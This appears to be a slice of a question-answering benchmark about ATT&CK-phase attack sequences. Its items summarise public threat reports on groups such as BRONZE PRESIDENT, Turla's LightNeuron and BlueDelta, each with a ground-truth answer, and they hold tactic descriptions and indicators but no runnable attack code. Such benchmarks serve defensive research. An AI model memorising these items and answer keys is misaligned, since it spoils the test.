Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth,Source
2339,39,39-Initial Access-T1566-Phishing,"After BRONZE PRESIDENT develops and uses tools like PlugX for resource development, is it likely that they will employ WMI event consumers and scheduled tasks for persistence after gaining initial access via phishing emails containing ZIP attachments with LNK files?",Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.,"Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2357,39,39-Lateral Movement-T1021-Remote Services,"After using tools like Nmap and Nbtscan to understand the target network environment and identify opportunities for lateral movement, is BRONZE PRESIDENT likely to leverage Wmiexec and net commands to execute WMI commands and connect to other hosts using compromised credentials before targeting specific data types and using batch scripts to collect and archive files for exfiltration?",Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.,"Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2362,391,391-Execution-T1059-Command and Scripting Interpreter,"After the FHAPPI campaign delivered an APT phishing email containing a link to malware hosted on a Geocities website and the VBScript downloaded and opened a .doc file leading to its execution, is it likely that the PowerShell command will run base64 encoded code and that the malware will use PowerShell for further execution?","Execution: The VBScript created an object in the shell and executed a PowerShell command to run base64 encoded code. This code led to the download and execution of a .ps1 file from another URL. The .ps1 file contained more base64 encoded code, which, when decoded, revealed the infection code for both 32-bit and 64-bit systems. The malware masqueraded as a 'Security Update' process and used PowerShell to execute the base64 code.","Initial Access: The FHAPPI campaign involved an APT phishing email containing a link to malware hosted on a Geocities website. The email's contents are undisclosed due to the sensitive nature of an APT attack. The malware, hosted under the account 'vbiayay1', was a VBScript encoded script. This script, when executed, would download a .doc file and open it, leading to the execution of a PowerShell attack to infect the victim's system with Poison Ivy.
Defense Evasion: The FHAPPI campaign utilized multiple encodings and wraps to avoid detection, including multilayered base64 encoding. The attack was fileless, avoiding known signatures, and did not originate from the attacker's territory, improving the chances of a successful APT campaign.
Command and Control: The malware communicated with a C2 server located at the IP address 61.97.243.15, a dial-up IP in South Korea. The domain used for C2 communication was 'web.outlooksysm.net', registered to an individual in China. The WHOIS information for the domain included contact details for 'Liu Ying'.
Others: The FHAPPI campaign was first recognized in Japan and named 'Free Hosting (pivoted) APT PowerSploit Poison Ivy' (FHAPPI). The campaign utilized Geocities Japan for hosting malware and targeted victims with a modified PowerSploit PoC code. The main payload was Poison Ivy, injected into the 'userinit.exe' process. The campaign also targeted Mongolian users with documents in Mongolian. The malware actions included extracting victim information, calling back to a C2 server, and other nefarious activities. The campaign was linked to a larger APT campaign and utilized email addresses 'wisers.data@gmail.com' and 'health.pro.demo30@gmail.com' for phishing. The CNC IP address and the email sender addresses are recommended to be blocked and traced. The malware files associated with the campaign have been deleted with the help of Yahoo Incident Response Division (YIRD), JP-CERT/CC, and other security professionals in Japan.",Yes,english-report-of-fhappi-freehosting
2367,392,392-Defense Evasion-T1070-Indicator Removal,"After netsat.exe executes commands from an encrypted file to infect removable media and collect system files, is it likely for the malware system to perform recursive directory listings and collect system details before cleaning up indicators of its presence by deleting key artifacts?","Defense Evasion: The malware system includes features to clean up after itself by deleting key indicators of its presence. It also employs date sensitivity, deleting itself after a hardcoded date to avoid detection.","Initial Access: The General Dynamics Fidelis Cybersecurity forensics team discovered a sophisticated malware system designed for data collection from individual computer systems, potentially optimized for insider agents or for targeting networks and air-gapped systems. The malware, identified as netsat.exe, netui3.dll, and winmgt.dll, infects removable media and collects data from drives when reconnected to the system. The malware self-deletes if the system date is past a hardcoded date, indicating a form of date checking for operational duration.
Execution: The malware netsat.exe operates as a master program, infecting connected removable media and collecting data from infected drives. It receives commands from an encrypted file on the local system, suggesting a command and control (C2) mechanism. The malware components netui3.dll and winmgt.dll serve as field units, collecting system information and files from connected systems and shared drives.
Discovery: The malware components netui3.dll and winmgt.dll collect detailed information from systems they infect, including IP addresses, platform details, system names, versions, domain controller status, network join status, OS version, running time, computer and user names, system directories, current date and time, locale information, drive details, network adapter descriptions, and recursive directory listings.
Collection: The malware collects data in the form of files, which may be obfuscated via a custom XOR operation. The collected data is presumably exfiltrated via other means not identified in the report.
Command and Control: Command and control (C2) is accomplished via commands in an encrypted file stored on the local 'master' system, indicating the need for either remote or local intruder access to the 'master' system or a C2 delivery/retrieval component.
Exfiltration: The means of exfiltration are not determined, but the data collection functionality of netsat.exe suggests that data for exfiltration might be collected by the 'master' system, indicating the need for either remote or local intruder access to the 'master' system or an exfiltration mechanism in the form of another piece of code.
Others: The Fidelis XPS advanced threat defense system has been updated with rules to detect various components of this malware system. Additional reverse engineering and analysis are ongoing. The malware system's unique functionality and potential for employment against a wide range of targets make it a significant concern for the network security community.",Yes,FTA 1001 FINAL 1.15.14
2369,392,392-Discovery-T1082-System Information Discovery,"After netsat.exe infects connected removable media and collects data from infected drives during execution, is it likely that netui3.dll and winmgt.dll will collect detailed system information before the malware self-deletes based on a hardcoded date for defense evasion?","Discovery: The malware components netui3.dll and winmgt.dll collect detailed information from systems they infect, including IP addresses, platform details, system names, versions, domain controller status, network join status, OS version, running time, computer and user names, system directories, current date and time, locale information, drive details, network adapter descriptions, and recursive directory listings.","Initial Access: The General Dynamics Fidelis Cybersecurity forensics team discovered a sophisticated malware system designed for data collection from individual computer systems, potentially optimized for insider agents or for targeting networks and air-gapped systems. The malware, identified as netsat.exe, netui3.dll, and winmgt.dll, infects removable media and collects data from drives when reconnected to the system. The malware self-deletes if the system date is past a hardcoded date, indicating a form of date checking for operational duration.
Execution: The malware netsat.exe operates as a master program, infecting connected removable media and collecting data from infected drives. It receives commands from an encrypted file on the local system, suggesting a command and control (C2) mechanism. The malware components netui3.dll and winmgt.dll serve as field units, collecting system information and files from connected systems and shared drives.
Defense Evasion: The malware system includes features to clean up after itself by deleting key indicators of its presence. It also employs date sensitivity, deleting itself after a hardcoded date to avoid detection.
Collection: The malware collects data in the form of files, which may be obfuscated via a custom XOR operation. The collected data is presumably exfiltrated via other means not identified in the report.
Command and Control: Command and control (C2) is accomplished via commands in an encrypted file stored on the local 'master' system, indicating the need for either remote or local intruder access to the 'master' system or a C2 delivery/retrieval component.
Exfiltration: The means of exfiltration are not determined, but the data collection functionality of netsat.exe suggests that data for exfiltration might be collected by the 'master' system, indicating the need for either remote or local intruder access to the 'master' system or an exfiltration mechanism in the form of another piece of code.
Others: The Fidelis XPS advanced threat defense system has been updated with rules to detect various components of this malware system. Additional reverse engineering and analysis are ongoing. The malware system's unique functionality and potential for employment against a wide range of targets make it a significant concern for the network security community.",Yes,FTA 1001 FINAL 1.15.14
2370,392,392-Collection-T1560-Archive Collected Data,"After discovering detailed system information and file listings through components like netui3.dll and winmgt.dll during the Discovery phase, is it likely that the malware will archive collected data using a custom XOR operation for obfuscation before exfiltrating it via other unidentified means during the Collection phase?","Collection: The malware collects data in the form of files, which may be obfuscated via a custom XOR operation. The collected data is presumably exfiltrated via other means not identified in the report.","Initial Access: The General Dynamics Fidelis Cybersecurity forensics team discovered a sophisticated malware system designed for data collection from individual computer systems, potentially optimized for insider agents or for targeting networks and air-gapped systems. The malware, identified as netsat.exe, netui3.dll, and winmgt.dll, infects removable media and collects data from drives when reconnected to the system. The malware self-deletes if the system date is past a hardcoded date, indicating a form of date checking for operational duration.
Execution: The malware netsat.exe operates as a master program, infecting connected removable media and collecting data from infected drives. It receives commands from an encrypted file on the local system, suggesting a command and control (C2) mechanism. The malware components netui3.dll and winmgt.dll serve as field units, collecting system information and files from connected systems and shared drives.
Defense Evasion: The malware system includes features to clean up after itself by deleting key indicators of its presence. It also employs date sensitivity, deleting itself after a hardcoded date to avoid detection.
Discovery: The malware components netui3.dll and winmgt.dll collect detailed information from systems they infect, including IP addresses, platform details, system names, versions, domain controller status, network join status, OS version, running time, computer and user names, system directories, current date and time, locale information, drive details, network adapter descriptions, and recursive directory listings.
Command and Control: Command and control (C2) is accomplished via commands in an encrypted file stored on the local 'master' system, indicating the need for either remote or local intruder access to the 'master' system or a C2 delivery/retrieval component.
Exfiltration: The means of exfiltration are not determined, but the data collection functionality of netsat.exe suggests that data for exfiltration might be collected by the 'master' system, indicating the need for either remote or local intruder access to the 'master' system or an exfiltration mechanism in the form of another piece of code.
Others: The Fidelis XPS advanced threat defense system has been updated with rules to detect various components of this malware system. Additional reverse engineering and analysis are ongoing. The malware system's unique functionality and potential for employment against a wide range of targets make it a significant concern for the network security community.",Yes,FTA 1001 FINAL 1.15.14
2380,393,393-Collection-T1119-Automated Collection,"After LightNeuron discovers system network configurations using functions like GetAdaptersInfo and GetComputerName, is it likely to collect emails and local files automatically for eventual exfiltration via its backdoor functions?","Collection: LightNeuron can collect all emails matching specified rules in its configuration, as well as exfiltrate any local file using a backdoor function. This behavior corresponds to MITRE ATT&CK techniques T1114, Email Collection, and T1005, Data from Local System. Additionally, LightNeuron can automatically collect files from a specific path, which is related to MITRE ATT&CK technique T1119, Automated Collection.","Initial Access: Turla, also known as Snake, is believed to have used stolen credentials to deploy LightNeuron, a backdoor specifically designed to target Microsoft Exchange mail servers. This tactic aligns with MITRE ATT&CK technique T1078, Valid Accounts.
Execution: A PowerShell script was utilized to install LightNeuron on the compromised Microsoft Exchange servers, corresponding to MITRE ATT&CK technique T1086, PowerShell.
Privilege Escalation: To obtain administrative rights on the Microsoft Exchange servers, attackers likely used stolen credentials, which is consistent with MITRE ATT&CK technique T1078, Valid Accounts.
Discovery: LightNeuron is capable of executing functions to discover system network configurations, specifically GetAdaptersInfo and GetComputerName, which aligns with MITRE ATT&CK technique T1016, System Network Configuration Discovery.
Command and Control: LightNeuron uses emails for Command and Control (C&C) communication, which is encrypted using AES and aligns with MITRE ATT&CK techniques T1032, Standard Cryptographic Protocol, and T1071, Standard Application Layer Protocol. The C&C data is hidden in PDF documents or JPG images using steganography, which is a form of data obfuscation (MITRE ATT&CK technique T1001).
Exfiltration: Data exfiltration is conducted through the email C&C channel (MITRE ATT&CK technique T1041, Exfiltration Over Command and Control Channel) and can be scheduled to occur during the night or working hours (MITRE ATT&CK technique T1029, Scheduled Transfer). The data is encrypted using AES (MITRE ATT&CK technique T1022, Data Encrypted).",Yes,ESET-LightNeuron
2415,398,398-Defense Evasion-T1202-Indirect Command Execution,"After leveraging control weaknesses in the Windows network to launch lateral movement attacks and compromise the Enterprise Admin account, is it likely that the attackers adopted the tactic of 'living off the land' using tools such as PSExec and plink.exe for defense evasion, before identifying bank employee credentials to manipulate customer debit cards?","Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",Yes,TW SpiderLabs Advanced Brief_Post-Soviet Bank Heists_PDF
2441,40,40-Command and Control-T1071-Application Layer Protocol,"After Elise malware collects system information such as IP addresses, installed software, and process enumeration for discovery purposes, is it likely to communicate with the hardcoded C2 server at 103.236.150[.]14 using an application layer protocol for Command and Control?","Command and Control: The malware communicates with a hardcoded C2 server with the IP address 103.236.150[.]14, sending harvested data and receiving files and commands.","Initial Access: The threat group DRAGONFISH, also known as Lotus Blossom, has been distributing a new variant of Elise malware through a malicious Microsoft Word document. The document, which contains information on ADMM-Plus members, embeds a malicious executable file as an OLE object. This file is dropped to the %temp% folder upon opening the document and is executed by exploiting the CVE-2017-11882 vulnerability. The payload is then moved to \AppData\Roaming\Microsoft\Windows\Caches\ as a file named NavShExt.dll, and the original executable is deleted.
Execution: The Elise malware initiates the following sequence of actions: it starts the Internet Explorer process (iexplore.exe) in a suspended state, injects the NavShExt.dll into the process, and calls the DLL's export function named 'Setting'. The process then continues to run in the background. The malware creates a mutex named 'donotbotherme' to prevent duplicate executions and stores harvested data in a file named thumbcache_1CD60.db located in AppData\Local\Microsoft\Windows\Explorer\. It also sends data to and downloads files and commands from a hardcoded C2 server with the IP address 103.236.150[.]14.
Persistence: Persistence is achieved by using the Run Registry key with the value name IAStorD located at HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD. Additionally, two hidden DLLs with export functions named DePatchEntry or EvilEntry are injected into iexplore.exe to provide loading and anti-analysis functionalities.
Defense Evasion: The malware employs various defense evasion techniques, including heavy anti-virtual-machine features, obfuscation techniques to exfiltrate data to the C2 server using base64-encoded cookie values, and spoofing the host to query non-existing domains to mislead malware analysts or network administrators. Debug paths are completely stripped from the malware.
Discovery: The malware harvests extensive system information, including LAN and WAN IP addresses (using ipaddress.com for the latter), installed software list, proxy information, process enumeration via tasklist, and a list of all files on the user's desktop.
Others: iDefense analysts have identified a campaign by the threat group DRAGONFISH targeting the ASEAN Defence Ministers' Meeting (ADMM) and associated individuals for espionage. The malware is capable of providing the attacker with a remote shell on the host and can completely uninstall itself. Execution debug messages are stored in the %temp% folder in a file named FXSAPIDebugLogFile.tmp, and logs are encrypted using a static AES key. To mitigate the threat, security teams are advised to block access to the C2 server and ensure the installation of Microsoft Security Update KB2553204 to patch the CVE-2017-11882 vulnerability. Analysts should look for artifacts such as a value named IAStorD in the autorun key, a file named FXSAPIDebugLogFile.tmp, a mutex handle named donotbotherme, and thumbcache_1CD60.db in AppData\Local\Microsoft\Windows\Explorer\.",Yes,Accenture-Security-Dragonfish-Threat-Analysis
2469,404,404-Credential Access-T1555-Credentials from Password Stores,"After persisting by configuring applications to run batch files every hour for operation continuity, is it likely that the Phantom Menace attackers would use legitimate applications to collect credentials from password stores before uploading these credentials to an external FTP server they controlled?","Credential Access: Legitimate applications were used to collect credentials from local mail clients and Internet browsers, saving them to text files. These credentials were then uploaded to an external FTP server controlled by the attackers.","Initial Access: An email with a seemingly innocuous PDF attachment was sent to Susan, a secretary at Black Gold. The PDF, which passed through all security filters, was actually an executable file disguised as a document, initiating the attack when opened.
Execution: The executable file created a folder and extracted six files, running 'stat.vbs' which in turn executed 'deca.bat'. This batch file opened a blank PDF and ran 'dcp.exe', a file encryption tool, to decrypt two files and extract the contents of 'bare.zip' into a different folder. The 'sai.vbs' script was then executed.
Persistence: The attack modified the Windows registry to ensure 'aagi.bat' ran at system start, and used legitimate applications to collect credentials, renaming them to indicate the time of collection. It also configured an application to run another batch file every hour to maintain its operations.
Defense Evasion: The attack evaded detection by using legitimate tools and scripts without any malicious activity, avoiding behavior-based detectors. It remained undetected for almost six months.
Collection: The attack collected credentials recurrently every hour, resulting in over 80,000 text files with stolen credentials from various firms, all within the oil and gas maritime transportation sector.
Command and Control: The attack used an FTP command to upload stolen credentials to an external server, and the 'iei.bat' file was run every hour to manage the collection and transmission of the data.
Exfiltration: Stolen credentials were exfiltrated to an FTP server, with the oldest files dating back to August 2013, indicating the long-term undetected nature of the attack.
Others: The attack, dubbed 'Phantom Menace', targeted companies in the oil and gas maritime transportation sector. It was linked to a scam involving fake oil deals, where stolen credentials were likely used to forge documents for fraudulent transactions. The attackers appeared to be based in Nigeria, with connections to Ikeja, known as the 'Computer Village'. Despite the evidence, victims were unwilling to report the crime, hindering police investigations. The case highlights the need for companies to perform regular audits and implement new protection strategies for network security.",Yes,oil-tanker-en
2492,407,407-Defense Evasion-T1027-Obfuscated Files or Information,Is it likely that Black Energy 2 will allocate memory in the svchost.exe process and launch the injected library’s code using APC queue processing for persistence after evading defenses by encrypting its payload and loading plugins directly onto the infected machine?,"Defense Evasion: Black Energy 2 evades defenses by hiding its payload using encryption, code compression, and potentially anti-emulation techniques. The malware's plugins are not executable files and are loaded directly onto an infected machine, which means they may not be distributed using mass propagation techniques, making it harder for antivirus vendors to detect new plugins.","Execution: Cybercriminals use Black Energy 2, detected as Backdoor.Win32.Blakken by Kaspersky Lab, to execute malicious activities on infected computers. The malware hides its code from antivirus products using encryption and code compression, and it infects system processes. Upon execution, Black Energy 2 allocates virtual memory, copies its decryptor code, and passes control to the decryptor, which then places dropper functionality code in memory. A decryptor driver with a random name is created in the system32drivers directory, and a corresponding service is started. The driver acts as a wrapper for the malware's core components.
Persistence: Black Energy 2 maintains persistence by injecting a DLL into the svchost.exe user-mode process. The infector driver, which contains the malicious DLL, locates the svchost.exe process, allocates memory in its address space, and launches the injected library's code using APC queue processing.
Command and Control: The botnet's command-and-control (C&C) center communicates with Black Energy 2 through HTTP requests. The bot sends a preformed HTTP request containing data that identifies the infected machine. The C&C responds with a bot configuration file, which is an encrypted XML document. The bot can receive general commands from the C&C, such as downloading and executing files, updating the bot, and setting contact frequency with the C&C server.
Impact: Black Energy 2 is primarily used to conduct DDoS attacks. It uses plugins like ddos, syn, and http to initiate mass connections and send random data packets to target servers. The malware can create a significant load on servers, especially when using the http plugin, which imitates an ordinary user visiting a page multiple times in a short period.
Others: Kaspersky Lab has identified over 4,000 modifications of Black Energy 2 since mid-2008. The malware has evolved to include plugins that extend its capabilities beyond DDoS attacks, potentially allowing for spam distribution, credential grabbing, and proxy server setup. Kaspersky Lab continues to monitor the evolution of Black Energy 2 and its plugins to track the threat's progression.",Yes,black-ddos
2518,45,45-Discovery-T1082-System Information Discovery,"After exploiting the Roundcube webmail software vulnerabilities to gain credential access by dumping OS credentials, including /etc/passwd and /etc/shadow files, is the BlueDelta campaign likely to perform system information discovery by exploiting vulnerabilities in Roundcube webmail software before utilizing Roundcube’s managesieve plugin to collect emails by auto-forwarding them to an actor-controlled email address?","Discovery: The BlueDelta campaign conducted discovery activities by exploiting vulnerabilities in Roundcube webmail software to gather system information, network configuration, owner/user discovery, and network connections discovery.","Reconnaissance: The BlueDelta campaign involved reconnaissance activities targeting Ukrainian government entities and an organization involved in Ukrainian military aircraft infrastructure upgrade and refurbishment. The campaign exploited vulnerabilities CVE-2020-35730, CVE-2020-12641, and CVE-2021-44026 in Roundcube webmail software to run reconnaissance and exfiltration scripts. These scripts were designed to redirect incoming emails to an actor-controlled email address, perform reconnaissance on the target Roundcube server, and exfiltrate the victim's Roundcube session cookie and address book, along with session and user information from Roundcube's database.
Initial Access: The BlueDelta campaign gained initial access by exploiting the Ukrainian government's Roundcube mail servers using CVE-2020-35730. This was achieved without the need for recipients to engage with the email attachment. The campaign also exploited the Microsoft Outlook zero-day vulnerability CVE-2023-23397 in 2022, which did not require user interaction and was triggered once the vulnerable Outlook client received the malicious email.
Execution: The BlueDelta campaign executed malicious scripts through the exploitation of vulnerabilities in Roundcube webmail software. The scripts redirected victims' future incoming emails to an actor-controlled email address and performed reconnaissance on the target Roundcube server. Additionally, the campaign exploited CVE-2023-23397 in Microsoft Outlook, allowing attackers to authenticate to other services by impersonating a victim.
Defense Evasion: BlueDelta used obfuscation techniques to avoid detection. The campaign involved the use of obfuscated JavaScript files and the deobfuscation of these files to execute the attack. The attackers also used encoded data to communicate with the compromised systems and avoid detection by security mechanisms.
Credential Access: BlueDelta accessed credentials by exploiting the Roundcube webmail software vulnerabilities to dump OS credentials, including /etc/passwd and /etc/shadow files, from the compromised systems.
Collection: BlueDelta collected emails by creating a filter within Roundcube's managesieve plugin, which automatically forwarded all emails received by the victim to a specified email address controlled by the attackers.
Command and Control: The BlueDelta campaign used web protocols for command and control activities, including the use of standard encoding to communicate with the compromised systems.
Exfiltration: BlueDelta exfiltrated data over alternative protocols and automated the exfiltration process. The campaign involved the exfiltration of the victim's Roundcube session cookie, address book, and database information.",Yes,BlueDelta Exploits Ukrainian Government Roundcube Mail Servers to Support Espionage Activities
